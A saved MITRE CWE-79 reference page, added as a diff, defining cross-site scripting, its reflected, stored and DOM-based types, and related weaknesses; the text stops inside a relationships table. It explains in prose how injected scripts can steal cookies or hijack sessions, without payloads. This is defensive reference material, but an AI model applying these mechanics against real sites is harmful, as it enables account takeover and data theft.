@@ -1,0 +1,851 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!--?xml version="1.0" encoding="iso-8859-1"?-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" encoding="iso-8859-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" lang="en"><head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta name="description" content="Common Weakness Enumeration (CWE) is a list of software weaknesses.">
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+	<link rel="shortcut icon" href="http://cwe.mitre.org/favicon.ico">
+	<link href="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/main.css" rel="stylesheet" type="text/css">
+	<!--[if IE]>
+	<link rel="stylesheet" type="text/css" href="/css/ie.css?version=1.7" />
+	<![endif]-->
+	
+	<script src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/browserheight.js" language="JavaScript" type="text/javascript"></script>
+	<script src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/jquery.js" language="JavaScript" type="text/javascript"></script>               	
+    	<script src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/cwe_minimizer.js" language="JavaScript" type="text/javascript"></script>
+	<script src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/cookie.js" language="JavaScript" type="text/javascript"></script>               	
+	<script src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/includeglossarydef.js" language="JavaScript" type="text/javascript"></script>
+	<link href="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/print.css" rel="stylesheet" media="print" type="text/css">
+	<link href="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/basic_summary.css" rel="stylesheet" type="text/css">
+	<noscript>
+	<style type="text/css">
+		#script { visibility:collapse; visibility:hidden; font-size:0px; height:0px; width:0px  }
+		#noscript { visibility:visible; font-size:inherit;  height:inherit; width:inherit}
+	</style>
+	</noscript>
+	<title>CWE -
+
+		CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (3.2)                </title>
+</head>
+<body onload="onloadCookie()">
+<a name="top" id="top"></a>
+	<div id="MastHead" style="width:100%">
+	
+	        <div style="width:70%;float:left;padding-top:20px;padding-left:10px;padding-bottom:10px;">
+	                <a href="http://cwe.mitre.org/index.html" style="color:#32498D; text-decoration:none">
+	                <img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/cwe_logo.jpg" style="float:left;border:0;margin-right:6px" alt="CWE" width="153" height="55">
+	                <h1 style="color:#314a8d;font-size:1.5em;font-family:'Verdana',sans-serif;text-shadow: 2px 2px #eee;margin: .1em auto">Common Weakness Enumeration</h1>
+	                <p style="color:#314a8d;font-style:italic;font-family:'Times New Roman';font-size:1em;text-shadow: 2px 2px #eee;margin:.1em auto 0 auto">A Community-Developed List of Software Weakness Types</p>
+	                </a>
+	        </div>
+	
+	</div><!--End Masthead div-->
+	
+	<div style="width:20%;float:right;padding-top:20px;text-align:right;padding-right:14px;"><a href="http://cwe.mitre.org/top25/" title="CWE Top 25"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/cwetop25.gif" alt="CWE/SANS Top 25 Most Dangerous Software Errors" style="vertical-align:bottom" width="124" height="53" border="0"></a></div>
+
+<div id="HeaderBar" class="noprint">
+<table width="100%" cellspacing="0" cellpadding="0" border="0">  
+	<tbody><tr> 
+		<td style="padding-left:10px; font-size:75%;" width="100%" align="left"> 
+		<a href="http://cwe.mitre.org/">Home</a>  &gt;  <a href="http://cwe.mitre.org/data/index.html">CWE List</a>  &gt;  
+
+                CWE- Individual Dictionary Definition (3.2)                		&nbsp;
+		</td>
+		<td style="padding-right:12px" nowrap="nowrap" align="right">
+		<!-- Begin /includes/search_cwe_id.html -->
+<div class="noprint">
+  <form action="/cgi-bin/jumpmenu.cgi" align="right" style="padding:0px; margin:0px">
+	ID <label for="id" style="padding-right:5px">Lookup:</label>
+    <input id="id" name="id" style="width:50px; font-size:80%" maxlength="10" type="text">
+	<input value="Go" style="padding: 0px; font-size:80%" type="submit">
+  </form>
+</div>
+<!-- End /includes/search_cwe_id.html --> 
+		</td>
+	</tr>
+</tbody></table>
+</div> <!--//HeaderBar-->
+<div class="yesprint">
+<hr style="clear:both" width="100%" size="1" color="#000000">
+</div>
+
+<div class="topnav">
+<ul>
+<li><a href="http://cwe.mitre.org/index.html">Home</a></li>
+<li>
+        <div class="dropdown">
+          <a href="http://cwe.mitre.org/about/index.html"><button class="dropbtn">About</button></a>
+          <div class="dropdown-content">
+            <a href="http://cwe.mitre.org/about/index.html">Overview</a>
+            <a href="http://cwe.mitre.org/about/process.html">Process</a>
+            <a href="http://cwe.mitre.org/about/sources.html">Sources</a>
+            <a href="http://cwe.mitre.org/documents/glossary/index.html">Glossary</a>
+            <a href="http://cwe.mitre.org/about/documents.html">Documents</a>
+            <a href="http://cwe.mitre.org/about/faq.html">FAQs</a>
+          </div>
+        </div>
+</li>
+
+<li>
+        <div class="dropdown">
+          <a href="http://cwe.mitre.org/data/index.html"><button class="dropbtn">CWE List</button></a>
+          <div class="dropdown-content">
+            <a href="http://cwe.mitre.org/data/index.html">Latest Version</a>
+            <a href="http://cwe.mitre.org/data/downloads.html">Downloads</a>
+            <a href="http://cwe.mitre.org/data/reports.html">Reports</a>
+            <a href="http://cwe.mitre.org/data/pdfs.html">Visualizations</a>
+            <a href="http://cwe.mitre.org/data/archive.html">Archive</a>
+          </div>
+        </div>
+</li>
+<li>
+        <div class="dropdown">
+          <a href="http://cwe.mitre.org/scoring/index.html"><button class="dropbtn">Scoring</button></a>
+          <div class="dropdown-content">
+            <a href="http://cwe.mitre.org/scoring/index.html">Methodologies</a>
+            <a href="http://cwe.mitre.org/community/swa/priority.html">Prioritizing Weaknesses</a>
+            <a href="http://cwe.mitre.org/cwss/cwss_v1.0.1.html">CWSS</a>
+            <a href="http://cwe.mitre.org/cwraf/index.html">CWRAF</a>
+            <a href="http://cwe.mitre.org/top25/index.html">Top 25</a>
+          </div>
+        </div>
+</li>
+<li>
+        <div class="dropdown">
+          <a href="http://cwe.mitre.org/community/index.html"><button class="dropbtn">Community</button></a>
+          <div class="dropdown-content">
+            <a href="http://cwe.mitre.org/community/index.html">Community</a>
+            <a href="http://cwe.mitre.org/community/citations.html">Use &amp; Citations</a>
+            <a href="http://cwe.mitre.org/research/index.html">Research</a>
+            <a href="http://cwe.mitre.org/compatible/index.html">Compatibility</a>
+            <a href="http://cwe.mitre.org/community/registration.html">Discussion List</a>
+            <a href="http://making-security-measurable.1364806.n2.nabble.com/Common-Weakness-Enumeration-f4149182.html">Discussion Archives</a>
+          </div>
+        </div>
+</li>
+<li>
+        <div class="dropdown">
+          <a href="http://cwe.mitre.org/news/index.html"><button class="dropbtn">News</button></a>
+          <div class="dropdown-content">
+            <a href="http://cwe.mitre.org/news/index.html">Current News</a>
+            <a href="http://cwe.mitre.org/news/archives/index.html">Archive</a>
+            <a href="http://cwe.mitre.org/news/newsletters.html">Free Newsletter</a>
+            <a href="https://www.linkedin.com/company/cve-cwe-capec" target="_blank" rel="noopener noreferrer"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/linkedin.png" alt="LinkedIn" style="position:relative; vertical-align:bottom; top:-1px"></a>
+          </div>
+        </div>
+</li>
+<li style="border-color:#aaaaaa"><a href="http://cwe.mitre.org/find/index.html">Search</a></li>
+</ul>
+
+</div>
+
+<table id="MainPane" width="100%" cellspacing="0" cellpadding="0" border="0">
+  <tbody><tr>
+	<!-- begin left side menu -->
+    <td rowspan="2" id="LeftPane" valign="top">
+	<!--include virtual="/includes/leftsidemenu.html" Removed 11212016--> 
+	<script type="text/javascript">browserheight();</script><div style="height:355px; width:1px" id="PageSpacer" class="noprint"></div>
+	</td>
+	<!-- end left side menu -->
+    <td style="height:1px"></td>
+	<!-- begin right column -->
+	<td rowspan="2" id="RightPane" valign="top" nowrap="nowrap" align="center">
+
+                	</td>
+	<!-- end right side menu -->
+  </tr>
+  <tr>
+	<!-- begin content pane -->
+    <td id="Contentpane" width="100%" valign="top">
+	
+	<!--Glossary tags-->
+	
+<div id="styled_popup" name="styled_popup" style="display:none; position:fixed; top:300; height:auto; width:300px; z-index:1000">
+<table style="border:1px solid #32498D;" width="300" cellspacing="0" cellpadding="0" border="0">
+<tbody><tr style="background-color:#32498D; color:#ffffff;">
+<td style="padding:1px 5px 1px 5px; border-bottom:1px solid #000000" width="100%"><div width="100%" style="font-weight:bold;">CWE Glossary Definition</div></td>
+<td style="padding:1px; border-bottom:1px solid #000000" valign="top" nowrap="nowrap"><a href="javascript:styledPopupClose();"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/close.gif" alt="x" border="0"></a></td>
+</tr>
+<tr><td colspan="2" style="background: url(/images/layout/ylgradient.jpg); background-repeat: repeat-x repeat-y; padding:5px; background-color:#FFFFCC; " valign="top">
+<div id="output" style="max-height:400px; overflow-y:auto"></div>
+</td></tr>
+</tbody></table>
+</div>
+
+                <script src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/nav.js" language="JavaScript" type="text/javascript"></script>
+                <noscript>
+                     <style>div.collapseblock { display:inline} </style>
+                </noscript>
+            
+            
+            <!-- Copyright (c) 2006-2019, The MITRE Corporation. CWE and the CWE logo are trademarks of The MITRE Corporation. -->            <a xmlns:xhtml="http://www.w3.org/1999/xhtml" name="79"></a><div class="noprint" style="overflow:auto;"><h2 style="display:inline; margin:0px 0px 2px 0px; vertical-align: text-bottom">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</h2><div style="text-align:right; margin:5px 0px 0px 5px; padding-bottom:1px; white-space:nowrap;"></div></div><div xmlns:xhtml="http://www.w3.org/1999/xhtml" id="CWEDefinition" class="Weakness"><div class="title"><div class="status"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td width="33%" valign="top" nowrap="nowrap" align="left"><div style="font-weight:bold">Weakness ID: 79</div><span style="font-size:80%"> Abstraction: <span style="font-weight:normal">Base</span><br>Structure: <span style="font-weight:normal">Simple</span></span></td><td valign="top" nowrap="nowrap" align="right"><div style="font-size:80%;"><b>Status: </b><span class="Usable"><span style="font-weight:normal">Usable</span></span></div></td></tr></tbody></table></div></div>
+							<div id="Filter_Menu" style="padding-bottom:10px;">
+							<div style="font-size:75%; color:#000066; font-style:italic; display:inline">Presentation Filter: </div>
+    <select id="SkinSelector" onchange="skinSelector();">
+    <option value="basic_summary" selected="selected">Basic</option>
+	<option value="complete">Complete</option>
+    <option value="high_level">High Level</option>
+    <option value="mapping_friendly">Mapping-Friendly</option>
+    </select> 
+							</div>
+						<div id="Description"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Description');"><img id="ocimg_79_Description" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Description</div><div name="oc_79_Description" id="oc_79_Description" class="expandblock"><div class="detail"><div class="indent">The
+ software does not neutralize or incorrectly neutralizes 
+user-controllable input before it is placed in output that is used as a 
+web page that is served to other users. </div></div></div></div><div id="Extended_Description"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Extended_Description');"><img id="ocimg_79_Extended_Description" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Extended Description</div><div name="oc_79_Extended_Description" id="oc_79_Extended_Description" class="expandblock"><div class="detail"><div class="indent"><p>Cross-site scripting (XSS) vulnerabilities occur when: </p><ul><li>1. Untrusted data enters a web application, typically from a web request. </li><li>2. The web application dynamically generates a web page that contains this untrusted data. </li><li>3.
+ During page generation, the application does not prevent the data from 
+containing content that is executable by a web browser, such as 
+JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, 
+etc. </li><li>4. A victim visits the generated web page through a web 
+browser, which contains malicious script that was injected using the 
+untrusted data. </li><li>5. Since the script comes from a web page that 
+was sent by the web server, the victim's web browser executes the 
+malicious script in the context of the web server's domain. </li><li>6. 
+This effectively violates the intention of the web browser's same-origin
+ policy, which states that scripts in one domain should not be able to 
+access resources or run code in a different domain. </li></ul><p>There are three main kinds of XSS: </p><ul><li><b>Type 1: Reflected XSS (or Non-Persistent) </b>-
+ The server reads data directly from the HTTP request and reflects it 
+back in the HTTP response. Reflected XSS exploits occur when an attacker
+ causes a victim to supply dangerous content to a vulnerable web 
+application, which is then reflected back to the victim and executed by 
+the web browser. The most common mechanism for delivering malicious 
+content is to include it as a parameter in a URL that is posted publicly
+ or e-mailed directly to the victim. URLs constructed in this manner 
+constitute the core of many phishing schemes, whereby an attacker 
+convinces a victim to visit a URL that refers to a vulnerable site. 
+After the site reflects the attacker's content back to the victim, the 
+content is executed by the victim's browser. </li><li><b>Type 2: Stored XSS (or Persistent) </b>-
+ The application stores dangerous data in a database, message forum, 
+visitor log, or other trusted data store. At a later time, the dangerous
+ data is subsequently read back into the application and included in 
+dynamic content. From an attacker's perspective, the optimal place to 
+inject malicious content is in an area that is displayed to either many 
+users or particularly interesting users. Interesting users typically 
+have elevated privileges in the application or interact with sensitive 
+data that is valuable to the attacker. If one of these users executes 
+malicious content, the attacker may be able to perform privileged 
+operations on behalf of the user or gain access to sensitive data 
+belonging to the user. For example, the attacker might inject XSS into a
+ log message, which might not be handled properly when an administrator 
+views the logs. </li><li><b>Type 0: DOM-Based XSS </b>- In DOM-based 
+XSS, the client performs the injection of XSS into the page; in the 
+other types, the server performs the injection. DOM-based XSS generally 
+involves server-controlled, trusted script that is sent to the client, 
+such as Javascript that performs sanity checks on a form before the user
+ submits it. If the server-supplied script processes user-supplied data 
+and then injects it back into the web page (such as with dynamic HTML), 
+then DOM-based XSS is possible. </li></ul><p>Once the malicious script 
+is injected, the attacker can perform a variety of malicious activities.
+ The attacker could transfer private information, such as cookies that 
+may include session information, from the victim's machine to the 
+attacker. The attacker could send malicious requests to a web site on 
+behalf of the victim, which could be especially dangerous to the site if
+ the victim has administrator privileges to manage that site. Phishing 
+attacks could be used to emulate trusted web sites and trick the victim 
+into entering a password, allowing the attacker to compromise the 
+victim's account on that web site. Finally, the script could exploit a 
+vulnerability in the web browser itself possibly taking over the 
+victim's machine, sometimes referred to as "drive-by hacking." </p><p>In
+ many cases, the attack can be launched without the victim even being 
+aware of it. Even with careful users, attackers frequently use a variety
+ of methods to encode the malicious portion of the attack, such as URL 
+encoding or Unicode, so the request looks less suspicious. </p></div></div></div></div><div id="Alternate_Terms"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Alternate_Terms');"><img id="ocimg_79_Alternate_Terms" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Alternate Terms</div><div name="oc_79_Alternate_Terms" id="oc_79_Alternate_Terms" class="expandblock"><div class="detail"><div class="indent"><div id="Grouped"><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0">
+            <tbody><tr><th valign="top" nowrap="nowrap">XSS:</th><td width="100%" valign="top"><div class="indent">"XSS" is a common abbreviation for Cross-Site Scripting. </div></td></tr>
+            <tr><th valign="top" nowrap="nowrap">HTML Injection:</th><td width="100%" valign="top"><div class="indent">"HTML injection" is used as a synonym of stored (Type 2) XSS. </div></td></tr>
+            <tr><th valign="top" nowrap="nowrap">CSS:</th><td width="100%" valign="top"><div class="indent">In
+ the early years after initial discovery of XSS, "CSS" was a 
+commonly-used acronym. However, this would cause confusion with 
+"Cascading Style Sheets," so usage of this acronym has declined 
+significantly. </div></td></tr>
+         </tbody></table></div></div></div></div></div><div id="Relationships"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Relationships');"><img id="ocimg_79_Relationships" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Relationships</div><div name="oc_79_Relationships" id="oc_79_Relationships" class="expandblock"><div class="detail"><div class="indent"><p>The
+ table(s) below shows the weaknesses and high level categories that are 
+related to this weakness. These relationships are defined as ChildOf, 
+ParentOf, MemberOf and give insight to similar items that may exist at 
+higher and lower levels of abstraction. In addition, relationships such 
+as PeerOf and CanAlsoBe are defined to show similar weaknesses that the 
+user may want to explore.</p><div id="relevant_table"><div class="reltable"><span id="script"><a href="javascript:toggleblocksOC('79_1000_relevant_table');"><img id="ocimg_79_1000_relevant_table" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_less.gif" alt="+" border="0"></a> </span>Relevant to the view "Research Concepts" (CWE-1000)<div name="oc_79_1000_relevant_table" id="oc_79_1000_relevant_table" class="collapseblock"><div class="tabledetail"><div class="indent"><div xmlns:saxon="http://saxon.sf.net/" xmlns:xalan="http://xml.apache.org/xalan" class="tabledetail"><table id="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="110px" valign="top">Nature</th><th width="40px" valign="top">Type</th><th width="50px" valign="top">ID</th><th valign="top">Name</th></tr></tbody><tbody><tr class="primary Weakness"><td valign="top">ChildOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/class.gif" alt="Class" class="icon"><span class="tip">Class
+ - a weakness that is described in a very abstract fashion, typically 
+independent of any specific language or technology. More general than a 
+Base weakness.</span></span></td><td valign="top">74</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/74.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">80</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/80.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">81</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/81.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Script in an Error Message Web Page</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">83</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/83.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Script in Attributes in a Web Page</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">84</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/84.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Encoded URI Schemes in a Web Page</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">85</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/85.html" target="_blank" rel="noopener noreferrer">Doubled Character XSS Manipulations</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">86</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/86.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Invalid Characters in Identifiers in Web Pages</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/variant.gif" alt="Variant" class="icon"><span class="tip">Variant
+ - a weakness that is described at a very low level of detail, typically
+ limited to a specific language or technology. More specific than a Base
+ weakness.</span></span></td><td valign="top">87</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/87.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of Alternate XSS Syntax</a></td></tr><tr class="primary Weakness"><td valign="top">ParentOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/chain.gif" alt="Chain" class="icon"><span class="tip">Chain
+ - a Compound Element that is a sequence of two or more separate 
+weaknesses that can be closely linked together within software. One 
+weakness, X, can directly create the conditions that are necessary to 
+cause another weakness, Y, to enter a vulnerable condition. When this 
+happens, CWE refers to X as "primary" to Y, and Y is "resultant" from X.
+ Chains can involve more than two weaknesses, and in some cases, they 
+might have a tree-like structure.</span></span></td><td valign="top">692</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/692.html" target="_blank" rel="noopener noreferrer">Incomplete Blacklist to Cross-Site Scripting</a></td></tr><tr class="primary Weakness"><td valign="top">PeerOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/composite.gif" alt="Composite" class="icon"><span class="tip">Composite
+ - a Compound Element that consists of two or more distinct weaknesses, 
+in which all weaknesses must be present at the same time in order for a 
+potential vulnerability to arise. Removing any of the weaknesses 
+eliminates or sharply reduces the risk. One weakness, X, can be "broken 
+down" into component weaknesses Y and Z. There can be cases in which one
+ weakness might not be essential to a composite, but changes the nature 
+of the composite when it becomes a vulnerability.</span></span></td><td valign="top">352</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/352.html" target="_blank" rel="noopener noreferrer">Cross-Site Request Forgery (CSRF)</a></td></tr><tr class="primary Weakness"><td valign="top">PeerOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/base.gif" alt="Base" class="icon"><span class="tip">Base
+ - a weakness that is described in an abstract fashion, but with 
+sufficient details to infer specific methods for detection and 
+prevention. More general than a Variant weakness, but more specific than
+ a Class weakness.</span></span></td><td valign="top">494</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/494.html" target="_blank" rel="noopener noreferrer">Download of Code Without Integrity Check</a></td></tr><tr class="primary Weakness"><td valign="top">CanFollow</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/base.gif" alt="Base" class="icon"><span class="tip">Base
+ - a weakness that is described in an abstract fashion, but with 
+sufficient details to infer specific methods for detection and 
+prevention. More general than a Variant weakness, but more specific than
+ a Class weakness.</span></span></td><td valign="top">113</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/113.html" target="_blank" rel="noopener noreferrer">Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')</a></td></tr><tr class="primary Weakness"><td valign="top">CanFollow</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/base.gif" alt="Base" class="icon"><span class="tip">Base
+ - a weakness that is described in an abstract fashion, but with 
+sufficient details to infer specific methods for detection and 
+prevention. More general than a Variant weakness, but more specific than
+ a Class weakness.</span></span></td><td valign="top">184</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/184.html" target="_blank" rel="noopener noreferrer">Incomplete Blacklist</a></td></tr><tr class="primary Weakness"><td valign="top">CanPrecede</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/base.gif" alt="Base" class="icon"><span class="tip">Base
+ - a weakness that is described in an abstract fashion, but with 
+sufficient details to infer specific methods for detection and 
+prevention. More general than a Variant weakness, but more specific than
+ a Class weakness.</span></span></td><td valign="top">494</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/494.html" target="_blank" rel="noopener noreferrer">Download of Code Without Integrity Check</a></td></tr></tbody></table></div></div></div></div></div></div><div id="relevant_table"><div class="reltable"><span id="script"><a href="javascript:toggleblocksOC('79_1003_relevant_table');"><img id="ocimg_79_1003_relevant_table" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_less.gif" alt="+" border="0"></a> </span>Relevant to the view "Weaknesses for Simplified Mapping of Published Vulnerabilities" (CWE-1003)<div name="oc_79_1003_relevant_table" id="oc_79_1003_relevant_table" class="collapseblock"><div class="tabledetail"><div class="indent"><div xmlns:saxon="http://saxon.sf.net/" xmlns:xalan="http://xml.apache.org/xalan" class="tabledetail"><table id="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="110px" valign="top">Nature</th><th width="40px" valign="top">Type</th><th width="50px" valign="top">ID</th><th valign="top">Name</th></tr></tbody><tbody><tr class="primary Weakness"><td valign="top">ChildOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/class.gif" alt="Class" class="icon"><span class="tip">Class
+ - a weakness that is described in a very abstract fashion, typically 
+independent of any specific language or technology. More general than a 
